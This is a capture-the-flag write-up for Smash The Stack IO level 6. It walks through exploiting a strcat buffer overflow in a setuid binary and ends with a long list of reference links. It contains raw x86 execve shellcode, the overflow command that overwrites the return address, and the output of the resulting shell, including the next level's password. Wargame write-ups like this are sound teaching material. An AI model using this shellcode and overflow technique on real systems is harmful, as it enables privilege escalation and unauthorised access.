__IO :: Level 6__
================

_Caleb Stewart_ | _Wednesday, January 27th, 2016_ 


> There is no information for this level.


----------


Start by [`ssh`][ssh]ing into the level. Supply the password you retrieved in the previous level.

```
ssh level6@io.smashthestack.org
```

Let's `cd` right into `/levels` and fire up `level06`. I was immediately greeted with


```
USAGE: ./level06 [name] [password]
```

Well, we don't have any valid usernames or passwords, but we can try and throw some stuff at it anyway. If we give it a password and username, it simply greets us as that user. 

```
level6@io:/levels$ ./level06 caleb super_secret_password
Hi caleb
```
Okay, with this information, we know it must be using our information somewhere. We could try throwing some information to it like an overflow, but lets dive into the source code. This one isn't as simple as the previous examples. The information isn't stored on the stack, and `strncpy` is used instead of `strcpy`. This is saddening, since this means we cannot directly overwrite the return address of main. The first thing I noticed was a call to the unsafe function `strcat` at line 31.

``` c
void greetuser(struct UserRecord user){
        char greeting[64];
        switch(language){
                case LANG_ENGLISH:
                        strcpy(greeting, "Hi "); break;
                case LANG_FRANCAIS:
                        strcpy(greeting, "Bienvenue "); break;
                case LANG_DEUTSCH:
                        strcpy(greeting, "Willkommen "); break;
        }
        strcat(greeting, user.name);
        printf("%s\n", greeting);
}
```

This is promising, but the length of `user.name` is bounded by 40 characters. Luckily, the call to `strncpy` allows us to overwrite the null byte of user.name. According to the definition of `struct User`, if we overwrite the null byte of `user.name` will essentially combine with `user.password`.

``` c
struct UserRecord{
        char name[40];
        char password[32];
        int id;
};
```

With this, we should be able to overwrite the return address of the `greetuser` function! Sadly, if we try this, we get a SEGFAULT, but I we do not overwrite the `greetuser` return address. In order to overwrite a little more of the buffer, I decided to change my language. A longer greeting means more stack trashing!

```
level6@io:/levels$ export LANG=de
level6@io:/levels$ gdb ./level06
(gdb) run `python -c "print 'a'*40"` `python -c "print 'a'*64"`
Starting program: /levels/level06 `python -c "print 'a'*40"` `python -c "print 'a'*64"`
Willkommen aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

Great! We can overwrite the return address. From here on out, we can proceed like we did in other challenges. First, find the offset to EIP in the stack. Next, we can grab some shellcode from the shell-storm repository. I used [`this`][shellcode] one specifically from the respository. We will throw that in an environment variable.

```
level6@io:/levels$ export SHELLCODE=`echo -e "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"`
```

Now, we need the address of the environment variable. We can use [`getenvaddr`][getenvaddr] to find the address within the level06 binary of our environment variable. This will be the value we overwrite the return address with.

```
level6@io:/tmp/illicittiger$ ./getenvaddr SHELLCODE /levels/level06
SHELLCODE will be at 0xbffffe85
```

Note, that this address will be different for you. Now, we can use this address to exploit our binary!

```
level6@io:/tmp/illicittiger$ /levels/level06 `python -c "print 'a'*40"` `python -c "print 'a'*25+'\x85\xfe\xff\xbf'"`
Willkommen aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
bash-4.2$ whoami
level07
bash-4.2$ cat /home/level7/.pass
U3A6ZtaTub14VmwV
```

Congratulations! You just solved level6!

[netcat]: https://en.wikipedia.org/wiki/Netcat
[Wikipedia]: https://www.wikipedia.org/
[Linux]: https://www.linux.com/
[man page]: https://en.wikipedia.org/wiki/Man_page
[PuTTY]: http://www.putty.org/
[ssh]: https://en.wikipedia.org/wiki/Secure_Shell
[Windows]: http://www.microsoft.com/en-us/windows
[virtual machine]: https://en.wikipedia.org/wiki/Virtual_machine
[operating system]:https://en.wikipedia.org/wiki/Operating_system
[OS]: https://en.wikipedia.org/wiki/Operating_system
[VMWare]: http://www.vmware.com/
[VirtualBox]: https://www.virtualbox.org/
[hostname]: https://en.wikipedia.org/wiki/Hostname
[port number]: https://en.wikipedia.org/wiki/Port_%28computer_networking%29
[distribution]:https://en.wikipedia.org/wiki/Linux_distribution
[Ubuntu]: http://www.ubuntu.com/
[ISO]: https://en.wikipedia.org/wiki/ISO_image
[standard streams]: https://en.wikipedia.org/wiki/Standard_streams
[standard output]: https://en.wikipedia.org/wiki/Standard_streams
[standard input]: https://en.wikipedia.org/wiki/Standard_streams
[read]: http://ss64.com/bash/read.html
[variable]: https://en.wikipedia.org/wiki/Variable_%28computer_science%29
[command substitution]: http://www.tldp.org/LDP/abs/html/commandsub.html
[permissions]: https://en.wikipedia.org/wiki/File_system_permissions
[permission]: https://en.wikipedia.org/wiki/File_system_permissions
[redirection]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[pipe]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[piping]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[tmp]: http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/tmp.html
[curl]: http://curl.haxx.se/
[cl1p.net]: https://cl1p.net/
[request]: http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html
[POST request]: https://en.wikipedia.org/wiki/POST_%28HTTP%29
[Python]: http://python.org/
[interpreter]: https://en.wikipedia.org/wiki/List_of_command-line_interpreters
[requests]: http://docs.python-requests.org/en/latest/
[urllib]: https://docs.python.org/2/library/urllib.html
[file handling with Python]: https://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files
[bash]: https://www.gnu.org/software/bash/
[Assembly]: https://en.wikipedia.org/wiki/Assembly_language
[the stack]:  https://en.wikipedia.org/wiki/Stack_%28abstract_data_type%29
[register]: http://www.tutorialspoint.com/assembly_programming/assembly_registers.htm
[hex]: https://en.wikipedia.org/wiki/Hexadecimal
[hexadecimal]: https://en.wikipedia.org/wiki/Hexadecimal
[archive file]: https://en.wikipedia.org/wiki/Archive_file
[zip file]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[zip files]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[.zip]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[gigabytes]: https://en.wikipedia.org/wiki/Gigabyte
[GB]: https://en.wikipedia.org/wiki/Gigabyte
[GUI]: https://en.wikipedia.org/wiki/Graphical_user_interface
[Wireshark]: https://www.wireshark.org/
[FTP]: https://en.wikipedia.org/wiki/File_Transfer_Protocol
[client and server]: https://simple.wikipedia.org/wiki/Client-server
[RETR]: http://cr.yp.to/ftp/retr.html
[FTP server]: https://help.ubuntu.com/lts/serverguide/ftp-server.html
[SFTP]: https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol
[SSL]: https://en.wikipedia.org/wiki/Transport_Layer_Security
[encryption]: https://en.wikipedia.org/wiki/Encryption
[HTML]: https://en.wikipedia.org/wiki/HTML
[Flask]: http://flask.pocoo.org/
[SQL]: https://en.wikipedia.org/wiki/SQL
[and]: https://en.wikipedia.org/wiki/Logical_conjunction
[Cyberstakes]: https://cyberstakesonline.com/
[cat]: https://en.wikipedia.org/wiki/Cat_%28Unix%29
[symbolic link]: https://en.wikipedia.org/wiki/Symbolic_link
[ln]: https://en.wikipedia.org/wiki/Ln_%28Unix%29
[absolute path]: https://en.wikipedia.org/wiki/Path_%28computing%29
[CTF]: https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security
[Cyberstakes]: https://cyberstakesonline.com/
[OverTheWire]: http://overthewire.org/
[Leviathan]: http://overthewire.org/wargames/leviathan/
[ls]: https://en.wikipedia.org/wiki/Ls
[grep]: https://en.wikipedia.org/wiki/Grep
[strings]: http://linux.die.net/man/1/strings
[ltrace]: http://linux.die.net/man/1/ltrace
[C]: https://en.wikipedia.org/wiki/C_%28programming_language%29
[strcmp]: http://linux.die.net/man/3/strcmp
[access]: http://pubs.opengroup.org/onlinepubs/009695399/functions/access.html
[system]: http://linux.die.net/man/3/system
[real user ID]: https://en.wikipedia.org/wiki/User_identifier
[effective user ID]: https://en.wikipedia.org/wiki/User_identifier
[brute force]: https://en.wikipedia.org/wiki/Brute-force_attack
[for loop]: https://en.wikipedia.org/wiki/For_loop
[bash programming]: http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
[Behemoth]: http://overthewire.org/wargames/behemoth/
[command line]: https://en.wikipedia.org/wiki/Command-line_interface
[command-line]: https://en.wikipedia.org/wiki/Command-line_interface
[cli]: https://en.wikipedia.org/wiki/Command-line_interface
[PHP]: https://php.net/
[URL]: https://en.wikipedia.org/wiki/Uniform_Resource_Locator
[TamperData]: https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
[Firefox]: https://www.mozilla.org/en-US/firefox/new/?product=firefox-3.6.8&os=osx%E2%8C%A9=en-US
[Caesar Cipher]: https://en.wikipedia.org/wiki/Caesar_cipher
[Google Reverse Image Search]: https://www.google.com/imghp
[PicoCTF]: https://picoctf.com/
[PicoCTF 2014]: https://picoctf.com/
[JavaScript]: https://www.javascript.com/
[base64]: https://en.wikipedia.org/wiki/Base64
[client-side]: https://en.wikipedia.org/wiki/Client-side_scripting
[client side]: https://en.wikipedia.org/wiki/Client-side_scripting
[javascript:alert]: http://www.w3schools.com/js/js_popup.asp
[Java]: https://www.java.com/en/
[2147483647]: https://en.wikipedia.org/wiki/2147483647_%28number%29
[XOR]: https://en.wikipedia.org/wiki/Exclusive_or
[XOR cipher]: https://en.wikipedia.org/wiki/XOR_cipher
[quipqiup.com]: http://www.quipqiup.com/
[PDF]: https://en.wikipedia.org/wiki/Portable_Document_Format
[pdfimages]: http://linux.die.net/man/1/pdfimages
[ampersand]: https://en.wikipedia.org/wiki/Ampersand
[URL encoding]: https://en.wikipedia.org/wiki/Percent-encoding
[Percent encoding]: https://en.wikipedia.org/wiki/Percent-encoding
[URL-encoding]: https://en.wikipedia.org/wiki/Percent-encoding
[Percent-encoding]: https://en.wikipedia.org/wiki/Percent-encoding
[endianness]: https://en.wikipedia.org/wiki/Endianness
[ASCII]: https://en.wikipedia.org/wiki/ASCII
[struct]: https://docs.python.org/2/library/struct.html
[pcap]: https://en.wikipedia.org/wiki/Pcap
[packet capture]: https://en.wikipedia.org/wiki/Packet_analyzer
[HTTP]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol
[Wireshark filters]: https://wiki.wireshark.org/DisplayFilters
[SSL]: https://en.wikipedia.org/wiki/Transport_Layer_Security
[Assembly]: https://en.wikipedia.org/wiki/Assembly_language
[Assembly Syntax]: https://en.wikipedia.org/wiki/X86_assembly_language#Syntax
[Intel Syntax]: https://en.wikipedia.org/wiki/X86_assembly_language
[Intel or AT&T]: http://www.imada.sdu.dk/Courses/DM18/Litteratur/IntelnATT.htm
[AT&T syntax]: https://en.wikibooks.org/wiki/X86_Assembly/GAS_Syntax
[GET request]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods
[GET requests]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods
[IP Address]: https://en.wikipedia.org/wiki/IP_address
[IP Addresses]: https://en.wikipedia.org/wiki/IP_address
[MAC Address]: https://en.wikipedia.org/wiki/MAC_address
[session]: https://en.wikipedia.org/wiki/Session_%28computer_science%29
[Cookie Manager+]: https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/
[hexedit]: http://linux.die.net/man/1/hexedit
[Google]: http://google.com/
[Scapy]: http://www.secdev.org/projects/scapy/
[ARP]: https://en.wikipedia.org/wiki/Address_Resolution_Protocol
[UDP]: https://en.wikipedia.org/wiki/User_Datagram_Protocol
[SQL injection]: https://en.wikipedia.org/wiki/SQL_injection
[sqlmap]: http://sqlmap.org/
[sqlite]: https://www.sqlite.org/
[MD5]: https://en.wikipedia.org/wiki/MD5
[OpenSSL]: https://www.openssl.org/
[Burpsuite]:https://portswigger.net/burp/
[Burpsuite.jar]:https://portswigger.net/burp/
[Burp]:https://portswigger.net/burp/
[NULL character]: https://en.wikipedia.org/wiki/Null_character
[Format String Vulnerability]: http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
[printf]: http://pubs.opengroup.org/onlinepubs/009695399/functions/fprintf.html
[argument]: https://en.wikipedia.org/wiki/Parameter_%28computer_programming%29
[arguments]: https://en.wikipedia.org/wiki/Parameter_%28computer_programming%29
[parameter]: https://en.wikipedia.org/wiki/Parameter_%28computer_programming%29
[parameters]: https://en.wikipedia.org/wiki/Parameter_%28computer_programming%29
[Vortex]: http://overthewire.org/wargames/vortex/
[socket]: https://docs.python.org/2/library/socket.html
[file descriptor]: https://en.wikipedia.org/wiki/File_descriptor
[file descriptors]: https://en.wikipedia.org/wiki/File_descriptor
[Forth]: https://en.wikipedia.org/wiki/Forth_%28programming_language%29
[github]: https://github.com/
[buffer overflow]: https://en.wikipedia.org/wiki/Buffer_overflow
[try harder]: https://www.offensive-security.com/when-things-get-tough/
[segmentation fault]: https://en.wikipedia.org/wiki/Segmentation_fault
[seg fault]: https://en.wikipedia.org/wiki/Segmentation_fault
[segfault]: https://en.wikipedia.org/wiki/Segmentation_fault
[shellcode]: https://en.wikipedia.org/wiki/Shellcode
[sploit-tools]: https://github.com/SaltwaterC/sploit-tools
[Kali]: https://www.kali.org/
[Kali Linux]: https://www.kali.org/
[gdb]: https://www.gnu.org/software/gdb/
[gdb tutorial]: http://www.unknownroad.com/rtfm/gdbtut/gdbtoc.html
[payload]: https://en.wikipedia.org/wiki/Payload_%28computing%29
[peda]: https://github.com/longld/peda
[git]: https://git-scm.com/
[home directory]: https://en.wikipedia.org/wiki/Home_directory
[NOP slide]:https://en.wikipedia.org/wiki/NOP_slide
[NOP]: https://en.wikipedia.org/wiki/NOP
[examine]: https://sourceware.org/gdb/onlinedocs/gdb/Memory.html
[stack pointer]: http://stackoverflow.com/questions/1395591/what-is-exactly-the-base-pointer-and-stack-pointer-to-what-do-they-point
[little endian]: https://en.wikipedia.org/wiki/Endianness
[big endian]: https://en.wikipedia.org/wiki/Endianness
[endianness]: https://en.wikipedia.org/wiki/Endianness
[pack]: https://docs.python.org/2/library/struct.html#struct.pack
[ash]:https://en.wikipedia.org/wiki/Almquist_shell
[dash]: https://en.wikipedia.org/wiki/Almquist_shell
[shell]: https://en.wikipedia.org/wiki/Shell_%28computing%29
[pwntools]: https://github.com/Gallopsled/pwntools
[colorama]: https://pypi.python.org/pypi/colorama
[objdump]: https://en.wikipedia.org/wiki/Objdump
[UPX]: http://upx.sourceforge.net/
[64-bit]: https://en.wikipedia.org/wiki/64-bit_computing
[breakpoint]: https://en.wikipedia.org/wiki/Breakpoint
[stack frame]: http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Mips/stack.html
[format string]: http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
[format specifiers]: http://web.eecs.umich.edu/~bartlett/printf.html
[format specifier]: http://web.eecs.umich.edu/~bartlett/printf.html
[variable expansion]: https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html
[base pointer]: http://stackoverflow.com/questions/1395591/what-is-exactly-the-base-pointer-and-stack-pointer-to-what-do-they-point
[dmesg]: https://en.wikipedia.org/wiki/Dmesg
[Android]: https://www.android.com/
[.apk]:https://en.wikipedia.org/wiki/Android_application_package
[apk]:https://en.wikipedia.org/wiki/Android_application_package
[decompiler]: https://en.wikipedia.org/wiki/Decompiler
[decompile Java code]: http://www.javadecompilers.com/
[jadx]: https://github.com/skylot/jadx
[.img]: https://en.wikipedia.org/wiki/IMG_%28file_format%29
[binwalk]: http://binwalk.org/
[JPEG]: https://en.wikipedia.org/wiki/JPEG
[JPG]: https://en.wikipedia.org/wiki/JPEG
[disk image]: https://en.wikipedia.org/wiki/Disk_image
[foremost]: http://foremost.sourceforge.net/
[eog]: https://wiki.gnome.org/Apps/EyeOfGnome
[function pointer]: https://en.wikipedia.org/wiki/Function_pointer
[machine code]: https://en.wikipedia.org/wiki/Machine_code
[compiled language]: https://en.wikipedia.org/wiki/Compiled_language
[compiler]: https://en.wikipedia.org/wiki/Compiler
[compile]: https://en.wikipedia.org/wiki/Compiler
[scripting language]: https://en.wikipedia.org/wiki/Scripting_language
[shell-storm.org]: http://shell-storm.org/
[shell-storm]:http://shell-storm.org/
[shellcode database]: http://shell-storm.org/shellcode/
[gdb-peda]: https://github.com/longld/peda
[x86]: https://en.wikipedia.org/wiki/X86
[Intel x86]: https://en.wikipedia.org/wiki/X86
[sh]: https://en.wikipedia.org/wiki/Bourne_shell
[/bin/sh]: https://en.wikipedia.org/wiki/Bourne_shell
[SANS]: https://www.sans.org/
[Holiday Hack Challenge]: https://holidayhackchallenge.com/
[USCGA]: http://uscga.edu/
[United States Coast Guard Academy]: http://uscga.edu/
[US Coast Guard Academy]: http://uscga.edu/
[Academy]: http://uscga.edu/
[Coast Guard Academy]: http://uscga.edu/
[Hackfest]: https://www.sans.org/event/pen-test-hackfest-2015
[SSID]: https://en.wikipedia.org/wiki/Service_set_%28802.11_network%29
[DNS]: https://en.wikipedia.org/wiki/Domain_Name_System
[Python:base64]: https://docs.python.org/2/library/base64.html
[OpenWRT]: https://openwrt.org/
[node.js]: https://nodejs.org/en/
[MongoDB]: https://www.mongodb.org/
[Mongo]: https://www.mongodb.org/
[SuperGnome 01]: http://52.2.229.189/
[Shodan]: https://www.shodan.io/
[SuperGnome 02]: http://52.34.3.80/
[SuperGnome 03]: http://52.64.191.71/
[SuperGnome 04]: http://52.192.152.132/
[SuperGnome 05]: http://54.233.105.81/
[Local file inclusion]: http://hakipedia.com/index.php/Local_File_Inclusion
[LFI]: http://hakipedia.com/index.php/Local_File_Inclusion
[PNG]: http://www.libpng.org/pub/png/
[.png]: http://www.libpng.org/pub/png/
[Remote Code Execution]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[RCE]: https://en.wikipedia.org/wiki/Arbitrary_code_execution
[GNU]: https://www.gnu.org/
[regular expression]: https://en.wikipedia.org/wiki/Regular_expression
[regular expressions]: https://en.wikipedia.org/wiki/Regular_expression
[uniq]: https://en.wikipedia.org/wiki/Uniq
[sort]: https://en.wikipedia.org/wiki/Sort_%28Unix%29
[binary data]: https://en.wikipedia.org/wiki/Binary_data
[binary]: https://en.wikipedia.org/wiki/Binary
[Firebug]: http://getfirebug.com/
[SHA1]: https://en.wikipedia.org/wiki/SHA-1
[SHA-1]: https://en.wikipedia.org/wiki/SHA-1
[Linux]: https://www.linux.com/
[Ubuntu]: http://www.ubuntu.com/
[Kali Linux]: https://www.kali.org/
[Over The Wire]: http://overthewire.org/wargames/
[OverTheWire]: http://overthewire.org/wargames/
[Micro Corruption]: https://microcorruption.com/
[Smash The Stack]: http://smashthestack.org/
[CTFTime]: https://ctftime.org/
[Writeups]: https://ctftime.org/writeups
[Competitions]: https://ctftime.org/event/list/upcoming
[Skull Security]: https://wiki.skullsecurity.org/index.php?title=Main_Page
[MITRE]: http://mitrecyberacademy.org/
[Trail of Bits]: https://trailofbits.github.io/ctf/
[Stegsolve]: http://www.caesum.com/handbook/Stegsolve.jar
[Steghide]: http://steghide.sourceforge.net/
[IDA Pro]: https://www.hex-rays.com/products/ida/
[Wireshark]: https://www.wireshark.org/
[Bro]: https://www.bro.org/
[Meterpreter]: https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/
[Metasploit]: http://www.metasploit.com/
[Burpsuite]: https://portswigger.net/burp/
[xortool]: https://github.com/hellman/xortool
[sqlmap]: http://sqlmap.org/
[VMWare]: http://www.vmware.com/
[VirtualBox]: https://www.virtualbox.org/wiki/Downloads
[VBScript Decoder]: https://gist.github.com/bcse/1834878
[quipqiup.com]: http://quipqiup.com/
[EXIFTool]: http://www.sno.phy.queensu.ca/~phil/exiftool/
[Scalpel]: https://github.com/sleuthkit/scalpel
[Ryan's Tutorials]: http://ryanstutorials.net
[Linux Fundamentals]: http://linux-training.be/linuxfun.pdf
[USCGA]: http://uscga.edu
[Cyberstakes]: https://cyberstakesonline.com/
[Crackmes.de]: http://crackmes.de/
[Nuit Du Hack]: http://wargame.nuitduhack.com/
[Hacking-Lab]: https://www.hacking-lab.com/index.html
[FlareOn]: http://www.flare-on.com/
[The Second Extended Filesystem]: http://www.nongnu.org/ext2-doc/ext2.html
[GIF]: https://en.wikipedia.org/wiki/GIF
[PDFCrack]: http://pdfcrack.sourceforge.net/index.html
[Hexcellents CTF Knowledge Base]: http://security.cs.pub.ro/hexcellents/wiki/home
[GDB]: https://www.gnu.org/software/gdb/
[The Linux System Administrator's Guide]: http://www.tldp.org/LDP/sag/html/index.html
[aeskeyfind]: https://citp.princeton.edu/research/memory/code/
[rsakeyfind]: https://citp.princeton.edu/research/memory/code/
[Easy Python Decompiler]: http://sourceforge.net/projects/easypythondecompiler/
[factordb.com]: http://factordb.com/
[Volatility]: https://github.com/volatilityfoundation/volatility
[Autopsy]: http://www.sleuthkit.org/autopsy/
[ShowMyCode]: http://www.showmycode.com/
[HTTrack]: https://www.httrack.com/
[theHarvester]: https://github.com/laramies/theHarvester
[Netcraft]: http://toolbar.netcraft.com/site_report/
[Nikto]: https://cirt.net/Nikto2
[PIVOT Project]: http://pivotproject.org/
[InsomniHack PDF]: http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf
[radare]: http://www.radare.org/r/
[radare2]: http://www.radare.org/r/
[foremost]: https://en.wikipedia.org/wiki/Foremost_%28software%29
[ZAP]: https://github.com/zaproxy/zaproxy
[Computer Security Student]: https://www.computersecuritystudent.com/HOME/index.html
[Vulnerable Web Page]: http://testphp.vulnweb.com/
[Hipshot]: https://bitbucket.org/eliteraspberries/hipshot
[John the Ripper]: https://en.wikipedia.org/wiki/John_the_Ripper
[hashcat]: http://hashcat.net/oclhashcat/
[fcrackzip]: http://manpages.ubuntu.com/manpages/hardy/man1/fcrackzip.1.html
[Whitehatters Academy]: https://www.whitehatters.academy/
[gn00bz]: http://gnoobz.com/
[Command Line Kung Fu]:http://blog.commandlinekungfu.com/
[Cybrary]: https://www.cybrary.it/
[Obum Chidi]: https://obumchidi.wordpress.com/
[ksnctf]: http://ksnctf.sweetduet.info/
[ToolsWatch]: http://www.toolswatch.org/category/tools/
[Net Force]:https://net-force.nl/
[Nandy Narwhals]: http://nandynarwhals.org/
[CTFHacker]: http://ctfhacker.com/
[Tasteless]: http://tasteless.eu/
[Dragon Sector]: http://blog.dragonsector.pl/
[pwnable.kr]: http://pwnable.kr/
[reversing.kr]: http://reversing.kr/
[DVWA]: http://www.dvwa.co.uk/
[Damn Vulnerable Web App]: http://www.dvwa.co.uk/
[b01lers]: https://b01lers.net/
[Capture the Swag]: https://ctf.rip/
[pointer]: https://en.wikipedia.org/wiki/Pointer_%28computer_programming%29
[call stack]: https://en.wikipedia.org/wiki/Call_stack
[return statement]: https://en.wikipedia.org/wiki/Return_statement
[return address]: https://en.wikipedia.org/wiki/Return_statement
[disassemble]: https://en.wikipedia.org/wiki/Disassembler
[less]: https://en.wikipedia.org/wiki/Less_%28Unix%29
[puts]: http://pubs.opengroup.org/onlinepubs/009695399/functions/puts.html
[disassembly]: https://en.wikibooks.org/wiki/X86_Disassembly
[PLT]: https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html
[Procedure Lookup Table]: http://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got
[environment variable]: https://en.wikipedia.org/wiki/Environment_variable
[getenvaddr]: https://code.google.com/p/protostar-solutions/source/browse/Stack+6/getenvaddr.c?r=3d0a6873d44901d63caf9ad3764cfb9ab47f3332
[getenvaddr.c]: https://code.google.com/p/protostar-solutions/source/browse/Stack+6/getenvaddr.c?r=3d0a6873d44901d63caf9ad3764cfb9ab47f3332
[Smash The Stack]: http://smashthestack.org/
[IO]: http://io.smashthestack.org:84/
[strace]: http://linux.die.net/man/1/strace
[echo]: http://ss64.com/bash/echo.html
[signal]:http://man7.org/linux/man-pages/man7/signal.7.html
[signals]: http://man7.org/linux/man-pages/man7/signal.7.html
[SIGFPE]: http://www.gnu.org/software/libc/manual/html_node/Program-Error-Signals.html
[eip]: http://www.go4expert.com/articles/stack-overflow-eip-overwrite-basics-t24917/
[seteuid]: http://man7.org/linux/man-pages/man2/seteuid.2.html
[popen]: http://linux.die.net/man/3/popen
[temporary file]: https://en.wikipedia.org/wiki/Temporary_file
[temporary files]: https://en.wikipedia.org/wiki/Temporary_file
[temporary folder]: https://en.wikipedia.org/wiki/Temporary_folder
[temporary directory]: https://en.wikipedia.org/wiki/Temporary_folder
[temp folder]: https://en.wikipedia.org/wiki/Temporary_folder
[shebang]: https://en.wikipedia.org/wiki/Shebang_%28Unix%29
[shebang line]: https://en.wikipedia.org/wiki/Shebang_%28Unix%29
[shellcode]: ../../../shell-storm/Linux/x86/execve(-bin-bash,_[-bin-sh,_-p],_NULL).c